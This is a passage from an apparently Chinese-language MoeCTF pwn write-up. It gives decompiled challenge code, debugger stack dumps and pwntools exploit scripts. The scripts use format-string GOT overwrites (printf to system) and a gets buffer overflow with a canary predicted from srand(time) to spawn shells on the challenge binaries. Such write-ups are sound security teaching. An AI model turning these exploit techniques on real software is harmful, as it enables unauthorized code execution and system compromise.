class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload8=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_ret_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload8)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload9=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload9)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload10=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_rbp_addr).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload10)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload11=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(r_addr_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload11)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload12=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_rbp_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload12)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload13=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(r_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload13)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload14=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_rbp_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload14)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload15=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(r_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload15)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload16=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(talk_ret_addr).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload16)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload17=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xed</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hhn&quot;</span></span><br><span class="line">p.send(payload17)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmt_t">fmt_t</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  fgets(s, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Anyone who uses format strings should be punished!\nGo to hell!&quot;</span>);</span><br><span class="line">  hell(<span class="number">5LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">hell</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve reached the level %d of hell.\n&quot;</span>, n);</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">    hell((<span class="type">unsigned</span> <span class="type">int</span>)(n + <span class="number">11</span>));</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)pd(s, n) )</span><br><span class="line">      <span class="built_in">printf</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve been swallowed by hell.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pd</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 i_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; i_1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + i) == <span class="number">37</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以从第一个格式化字符串漏洞得到libc基址，发现一个嵌套函数，还有一个pd函数判断是否含”%“</p>
<p>第一次只能输入4个有效字符，有什么用呢？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Moectf/fmt_t/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>got表可写，假如我在第一次输入时写入sh，将printf改为system，就可以实现劫持，要调用printf要一个%，所以可以写入sh;%</p>
<p>参照fmt_s，我们应该先写入地址，再进行修改，这道题利用格式化字符串漏洞的机会最多3次，因此考虑利用一次将所以内容修改</p>
<p>因此我们在第二次输入时将printf的got表地址在栈上布置好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffe6d8e2760 ◂— 0x16d8e2998</span><br><span class="line">01:0008│-068 0x7ffe6d8e2768 ◂— 0x1000000000</span><br><span class="line">02:0010│ rax 0x7ffe6d8e2770 —▸ 0x40401a (<span class="built_in">printf</span>@got[plt]+2) ◂— 0xf38000007ea41506</span><br><span class="line">03:0018│-058 0x7ffe6d8e2778 —▸ 0x404018 (<span class="built_in">printf</span>@got[plt]) —▸ 0x7ea4150606f0 (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">04:0020│-050 0x7ffe6d8e2780 —▸ 0x7ea41521aaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">05:0028│-048 0x7ffe6d8e2788 —▸ 0x7ffe6d8e27f0 ◂— 0x7e00253b6873 /* <span class="string">&#x27;sh;%&#x27;</span> */</span><br><span class="line">06:0030│-040 0x7ffe6d8e2790 ◂— 0</span><br></pre></td></tr></table></figure>
<p>在第三次利用布置好的地址进行修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffe6d8e26e0 ◂— 0x16d8e2998</span><br><span class="line">01:0008│-068 0x7ffe6d8e26e8 ◂— 0x1b00000000</span><br><span class="line">02:0010│ rax 0x7ffe6d8e26f0 ◂— <span class="string">&#x27;%3440c%25$hn%1941c%24$hn&#x27;</span></span><br><span class="line">03:0018│-058 0x7ffe6d8e26f8 ◂— <span class="string">&#x27;5$hn%1941c%24$hn&#x27;</span></span><br><span class="line">04:0020│-050 0x7ffe6d8e2700 ◂— <span class="string">&#x27;1c%24$hn&#x27;</span></span><br><span class="line">05:0028│-048 0x7ffe6d8e2708 ◂— 0x7ffe6d000000</span><br><span class="line">06:0030│-040 0x7ffe6d8e2710 ◂— 0</span><br><span class="line">07:0038│-038 0x7ffe6d8e2718 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401180 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">08:0040│-030 0x7ffe6d8e2720 —▸ 0x7ea415360040 (_rtld_global) —▸ 0x7ea4153612e0 ◂— 0</span><br><span class="line">09:0048│-028 0x7ffe6d8e2728 —▸ 0x7ea41507f410 (fgets+144) ◂— mov edx, dword ptr [rbp]</span><br><span class="line">0a:0050│-020 0x7ffe6d8e2730 ◂— 0</span><br><span class="line">0b:0058│-018 0x7ffe6d8e2738 —▸ 0x7ffe6d8e27d0 —▸ 0x7ffe6d8e2850 —▸ 0x7ffe6d8e2880 ◂— 1</span><br><span class="line">0c:0060│-010 0x7ffe6d8e2740 —▸ 0x7ffe6d8e2998 —▸ 0x7ffe6d8e39ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_t/pwn_patched&#x27;</span></span><br><span class="line">0d:0068│-008 0x7ffe6d8e2748 ◂— 0x37d295624a871a00</span><br><span class="line">0e:0070│ rbp 0x7ffe6d8e2750 —▸ 0x7ffe6d8e27d0 —▸ 0x7ffe6d8e2850 —▸ 0x7ffe6d8e2880 ◂— 1</span><br><span class="line">0f:0078│+008 0x7ffe6d8e2758 —▸ 0x4012b9 (hell+115) ◂— mov eax, dword ptr [rbp - 0x64]</span><br><span class="line">10:0080│+010 0x7ffe6d8e2760 ◂— 0x16d8e2998</span><br><span class="line">11:0088│+018 0x7ffe6d8e2768 ◂— 0x1000000000</span><br><span class="line">12:0090│+020 0x7ffe6d8e2770 —▸ 0x40401a (<span class="built_in">printf</span>@got[plt]+2) ◂— 0xf38000007ea41506</span><br><span class="line">13:0098│+028 0x7ffe6d8e2778 —▸ 0x404018 (<span class="built_in">printf</span>@got[plt]) —▸ 0x7ea4150606f0 (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">14:00a0│+030 0x7ffe6d8e2780 —▸ 0x7ea41521aaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">15:00a8│+038 0x7ffe6d8e2788 —▸ 0x7ffe6d8e27f0 ◂— 0x7e00253b6873 /* <span class="string">&#x27;sh;%&#x27;</span> */</span><br><span class="line">16:00b0│+040 0x7ffe6d8e2790 ◂— 0</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GOT protection: Partial RELRO | Found 5 GOT entries passing the filter</span><br><span class="line">[0x404000] puts@GLIBC_2.2.5 -&gt; 0x7ea415080e50 (puts) ◂— endbr64</span><br><span class="line">[0x404008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404010] setbuf@GLIBC_2.2.5 -&gt; 0x7ea415087fe0 (setbuf) ◂— endbr64</span><br><span class="line">[0x404018] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x7ea4150606f0 (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">[0x404020] fgets@GLIBC_2.2.5 -&gt; 0x7ea41507f380 (fgets) ◂— endbr64</span><br></pre></td></tr></table></figure>
<p>修改后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GOT protection: Partial RELRO | Found 5 GOT entries passing the filter</span><br><span class="line">[0x404000] puts@GLIBC_2.2.5 -&gt; 0x7ea415080e50 (puts) ◂— endbr64</span><br><span class="line">[0x404008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404010] setbuf@GLIBC_2.2.5 -&gt; 0x7ea415087fe0 (setbuf) ◂— endbr64</span><br><span class="line">[0x404018] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x7ea415050d70 (system) ◂— endbr64</span><br><span class="line">[0x404020] fgets@GLIBC_2.2.5 -&gt; 0x7ea41507f380 (fgets) ◂— endbr64</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.send(<span class="string">b&quot;%31$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">data=p.recv(<span class="number">12</span>)</span><br><span class="line">libc_main_addr=<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">libc_base_addr=libc_main_addr-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">128</span></span><br><span class="line">system_addr=libc_base_addr+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libc_base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base_addr)&#125;</span>&quot;</span>)</span><br><span class="line">system_1 = system_addr &amp; <span class="number">0xffff</span> </span><br><span class="line">system_2 = (system_addr &gt;&gt; <span class="number">16</span>)&amp; <span class="number">0xffff</span> </span><br><span class="line">system_3=(system_2-system_1)&amp; <span class="number">0xffff</span></span><br><span class="line">got_addr=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">got_1 = got_addr &amp; <span class="number">0xffff</span> </span><br><span class="line">got_2 = (got_addr &gt;&gt; <span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;of hell.\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&quot;sh;%&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;of hell.\n&quot;</span>)</span><br><span class="line">payload2=p64(got_addr+<span class="number">2</span>)+p32(got_addr)</span><br><span class="line">p.send(payload2.ljust(<span class="number">15</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;of hell.\n&quot;</span>)</span><br><span class="line">payload4=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%25$hn&quot;</span>+<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%24$hn&quot;</span></span><br><span class="line">p.send(payload4.ljust(<span class="number">27</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="boom-boom_revenge">boom &amp; boom_revenge</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">124</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> canary; <span class="comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Secret Message Book!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to brute-force this system? (y/n)&quot;</span>);</span><br><span class="line">  fgets(&amp;brute_choice, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( brute_choice == <span class="number">121</span> || brute_choice == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">1</span>;</span><br><span class="line">    canary = (<span class="type">int</span>)random() % <span class="number">114514</span>;</span><br><span class="line">    canary = canary;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;boom!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Brute-force mode enabled! Security on.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Normal mode. No overflow allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your message: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    gets(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &amp;&amp; canary != canary )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Security check failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Message received.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000401276</span> win             proc near</span><br><span class="line">.text:<span class="number">0000000000401276</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401276</span>                 endbr64</span><br><span class="line">.text:<span class="number">000000000040127</span>A                 push    rbp</span><br><span class="line">.text:<span class="number">000000000040127B</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040127</span>E                 lea     rax, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401285</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000401288</span>                 call    _system</span><br><span class="line">.text:<span class="number">000000000040128</span>D                 nop</span><br><span class="line">.text:<span class="number">000000000040128</span>E                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040128F</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040128F</span> ; &#125; <span class="comment">// starts at 401276</span></span><br><span class="line">.text:<span class="number">000000000040128F</span> win             endp</span><br></pre></td></tr></table></figure>
<p>下面是boom_revenge的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">124</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> canary; <span class="comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Secret Message Book!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to brute-force this system? (y/n)&quot;</span>);</span><br><span class="line">  fgets(&amp;brute_choice, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( brute_choice == <span class="number">121</span> || brute_choice == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">1</span>;</span><br><span class="line">    canary = (<span class="type">int</span>)random() % <span class="number">114514</span>;</span><br><span class="line">    canary = canary;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;boom!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Brute-force mode enabled! Security on.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Normal mode. No overflow allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your message: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">if</span> ( canary != canary )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Security check failed!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Message received.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后门函数也存在</p>
<p>区别就在</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#boom</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    gets(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &amp;&amp; canary != canary )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Security check failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Message received.&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#boom_revenge</span><br><span class="line">	<span class="title function_">if</span> <span class="params">( v6 )</span>&#123;</span><br><span class="line">    	gets(s);</span><br><span class="line">    	<span class="keyword">if</span> ( canary != canary )&#123;</span><br><span class="line">      		<span class="built_in">puts</span>(<span class="string">&quot;Security check failed!&quot;</span>);</span><br><span class="line">      		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">else</span>&#123;</span><br><span class="line">    	fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="built_in">puts</span>(<span class="string">&quot;Message received.&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>要实现溢出，就要使用gets(s)，就要v6=1</p>
<p>在boom中我们直接可以将v6覆盖为零，并且覆盖返回地址，这样就不会触发exit</p>
<p>在boom_revenge中我们无法利用boom的方法，就直接利用随机数生成canary通过检验并且覆盖返回地址就行了</p>
<p>只展示boom_revenge的方法，boom使用这个也可以过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Do you want to brute-force this system? (y/n)\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;y\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))</span><br><span class="line">canary = elf1.rand()%<span class="number">114514</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;生成的 canary 值: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>,<span class="subst">&#123;canary&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter your message: &quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x7C</span>+p32(canary)+<span class="string">b&#x27;0&#x27;</span>*<span class="number">12</span>+p32(<span class="number">1</span>)+p64(<span class="number">0x40127E</span>)*<span class="number">2</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="randomlock">randomlock</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  initseed();</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My lock looks strange—can you help me?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;password 